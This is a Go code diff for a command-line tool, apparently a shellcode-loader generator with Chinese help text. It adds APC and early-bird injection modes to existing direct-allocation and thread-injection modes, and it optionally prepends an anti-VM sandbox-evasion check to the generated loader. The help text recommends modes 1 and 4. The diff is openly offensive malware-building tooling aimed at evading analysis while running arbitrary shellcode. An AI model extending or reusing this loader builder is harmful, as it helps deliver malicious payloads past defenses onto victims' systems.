@@ -22,17 +22,30 @@ var localCmd = &cobra.Command{
 		module, _ := cmd.Flags().GetString("module")
 		outputname, _ := cmd.Flags().GetString("output")
 		fmt.Println("调用本地加载模块")
-		if module == "1" {
+		switch module {
+		case "1":
 			if sandbox {
 				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.OriginalLoader(\"%v\")", fp))
 			} else {
 				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.OriginalLoader(\"%v\")", fp))
 			}
-		} else if module == "2" {
+		case "2":
 			if sandbox {
 				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.DirectShellcodeInject(\"%v\")", fp))
 			} else {
 				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.DirectShellcodeInject(\"%v\")", fp))
+			}
+		case "3":
+			if sandbox {
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.ApcShellcodeInject(\"%v\")", fp))
+			} else {
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.ApcShellcodeInject(\"%v\")", fp))
+			}
+		case "4":
+			if sandbox {
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.AntiVM()"+"\n\t"+"tools.EaybirlInject(\"%v\")", fp))
+			} else {
+				tools.CreateGoFile("z2z.go", outputname, fmt.Sprintf("tools.EaybirlInject(\"%v\")", fp))
 			}
 		}
 		log.Println("文件创建完成,请到output目录下查看")
@@ -42,7 +55,7 @@ var localCmd = &cobra.Command{
 func init() {
 	rootCmd.AddCommand(localCmd)
 	localCmd.Flags().StringP("file", "f", "", "加载本地shellcode文件,请用类似\"E:\\test\\shellcode\\output.bin\"的格式插入")
-	localCmd.Flags().StringP("module", "m", "1", "选择shellcode加载方式,1为直接内存分配,2为APC注入")
+	localCmd.Flags().StringP("module", "m", "1", "选择shellcode加载方式,1为直接内存分配,2为线程注入,3为apc注入，4为earybirl注入，推荐使用1和4")
 	localCmd.MarkFlagRequired("file")
 	localCmd.Flags().StringP("output", "o", "z2z.exe", "输出文件的名字")
 	// localCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
